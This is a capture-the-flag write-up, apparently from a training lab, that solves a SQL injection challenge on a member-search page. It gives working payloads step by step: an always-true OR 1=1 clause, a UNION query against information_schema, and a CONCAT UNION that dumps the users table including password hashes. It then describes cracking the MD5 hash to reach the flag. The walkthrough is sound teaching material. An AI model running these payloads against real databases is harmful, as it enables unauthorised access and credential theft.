SQL injection on member page

We have to change the member by their ids
Let's try to do a Where clause that is always True like 1=1

1 OR 1=1 is equal to WHERE users.id = 1 OR 1 = 1 (so is always true)

it gives us all the users in the table users\*, the last one shown seems to contain the flag
Why -1 ?
-1: This value is typically used to make the original query return no results. It can be any value that doesn't exist in the database, depending on the context of the query.

Now let's determine all the column present in users table, for this we're going to do a UNION injection

This one doesn't work:
-1 UNION SELECT \* from users

So let's try to dig in the default table containing the metadata of all column of the db:
-1 UNION SELECT table_name, column_name FROM information_schema.columns

We now have the whole table structure
user_id, first_name, last_name, town, country, planet, Commentaire, countersign

We know that the query only returns two column first name and surname so lets CONCAT all the column into one:
-1 UNION SELECT CONCAT(first_name, last_name, town, country, planet, Commentaire, countersign) as first_name, 1 from users

last result:
First name: FlagGetThe424242Decrypt this password -> then lower all the char. Sh256 on it and it's good !5ff9d0165b4f92b14994e5c685cdce28

Look for the md5 decrypt of the script then lower the string and then hash it in sh256, the flag should be the result of it
